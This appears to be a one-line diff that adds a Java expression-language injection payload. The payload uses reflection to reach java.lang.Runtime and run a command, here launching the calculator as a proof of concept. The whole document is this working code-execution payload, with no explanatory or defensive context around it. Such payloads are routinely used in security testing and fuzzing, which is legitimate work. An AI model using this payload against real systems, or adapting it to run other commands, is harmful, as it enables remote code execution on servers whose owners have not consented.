@@ -1,0 +1,1 @@
+${''.class.forName('java.lang.Runtime').getRuntime().exec('calc')}
